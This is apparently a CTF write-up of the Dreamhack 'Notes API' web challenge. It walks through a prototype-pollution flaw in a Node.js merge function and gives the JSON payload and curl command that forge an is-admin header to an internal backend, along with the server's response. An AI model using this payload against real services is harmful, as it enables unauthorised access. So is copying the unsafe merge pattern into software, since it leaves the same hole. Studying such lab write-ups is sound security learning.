---
title: "Dreamhack: Notes API"
date: 2025-08-13
tags:
  - web
  - ctf
  - nodejs
  - prototype_pollution
draft: false
---
##### Link : [Notes-API](https://dreamhack.io/wargame/challenges/1288)

##### Description
```
You are provided with a web service that allows you to test backend APIs.
Find a vulnerability in the web service, exploit it, and obtain the flag!
```

# Solve

## Finding the Foothold

When I first encountered this challenge, the first thing I looked at was the `docker-compose.yml` file. In CTFs, the environment configuration often holds the core intent of the problem. As expected, I found two services: a Node.js-based `app` service that users could access, and a Python-based `backend` service that existed only on the internal network. The structure was clear: I needed to find a vulnerability in the `app` to attack the `backend`.

My final goal would be in the `backend`, so I first checked the `deploy/backend/main.py` code. It was crucial to find the most likely place to get the flag.

```js title="deploy/backend/main.py"
@app.get('/admin')
async def get_admin(request: Request):
    is_admin = request.headers.get('is-admin') # This is it!
    if is_admin != 'true':
        return JSONResponse(status_code=401, content=None)

    return {'message': FLAG}
```

Just as I thought, there was an endpoint with the intuitive name `/admin`. This code confirmed my hypothesis: **I could get the flag by sending a `GET` request to the backend server with an `is-admin: true` header.** My goal now was to figure out how to trick the `app` server into sending that request for me.



## **Planning the Attack**

It was time to analyze the entry point, `deploy/app/server.js`. Skimming through the code, I saw that the `/api` endpoint played a key role in interacting with the user and sending requests to the backend.

```js title="deploy/app/server.js"
function update(dest, src) {
    for (var key in src) { // No validation for 'key'.
        if (typeof src[key] !== 'object') {
            dest[key] = src[key];
        } else {
            if (typeof dest[key] !== 'object') {
                dest[key] = {};
            }
            update(dest[key], src[key]);
        }
    }
}

function setAPI(apiInfo, userApiInfo) {
    update(apiInfo, JSON.parse(userApiInfo));
}
```

The moment I saw the `update` function, which is called inside `setAPI`, I knew I'd found it. The `for...in` loop had no defense against a `key` value of `__proto__`. This is a classic **Prototype Pollution** vulnerability. With this, I could pollute the "master blueprint" (`Object.prototype`) used by all JavaScript objects with whatever I wanted.

Now, I laid out my attack plan:

1. **Manipulate the request path and method:** I needed to send a `GET` request to `/admin`. This was simple. Including `{ "path": "/admin", "method": "GET" }` in the `api_info` parameter would directly set these values on the `apiInfo` object.
    
2. **Craft the `is-admin` header:** This was the key. Since we don't have an admin session, the `isAdmin` variable in the `callAPI` function will always be `undefined`. However, if we pollute `Object.prototype`, the **new, empty object** created by `const headers = {}` inside `callAPI` will inherit the polluted properties. The crucial insight here is how the `node-fetch` library works. It has a feature that **automatically converts** camelCase object keys (like `isAdmin`) into kebab-case HTTP headers (like `is-admin`). Therefore, all I needed to do was plant `isAdmin: true` into the prototype.
    

I combined these two plans to create my final payload.

```json
{
    "path": "/admin",
    "method": "GET",
    "__proto__": {
        "isAdmin": true
    }
}
```



## **Execution**

All that was left was to execute the attack. Using `curl`, I sent the payload I designed to the `/api` endpoint as the `api_info` parameter.

```bash
% curl -v -X POST "http://host8.dreamhack.games:15104/api" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d 'api_info={"path":"/admin","method":"GET","__proto__":{"isAdmin":true}}'

Note: Unnecessary use of -X or --request, POST is already inferred.
* Host host8.dreamhack.games:15104 was resolved.
* IPv6: (none)
* IPv4: 158.247.232.53
*   Trying 158.247.232.53:15104...
* Connected to host8.dreamhack.games (158.247.232.53) port 15104
> POST /api HTTP/1.1
> Host: host8.dreamhack.games:15104
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 70
> 
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Content-Type: application/json; charset=utf-8
< Content-Length: 84
< ETag: W/"54-xBbPrdP4P28wMOX6YLphbBcP6/U"
< Set-Cookie: connect.sid=s%3Azz2EJM_L16gX2ygN053gCFdG172ULY53.Zy1YyP%2F7ZrWVioGsbbx3p5NEPsi%2FcODbhCijeh5jKj0; Path=/; HttpOnly
< Date: Wed, 13 Aug 2025 07:22:12 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< 

* Connection #0 to host host8.dreamhack.games left intact
{"message":"DH{REDACTED"}
```

As expected, the `app` server, based on the prototype I had polluted, sent a manipulated request to the `backend` server. The resulting JSON response containing the flag was printed beautifully in my terminal. It was a very enjoyable problem that involved polluting a blueprint to get the desired result.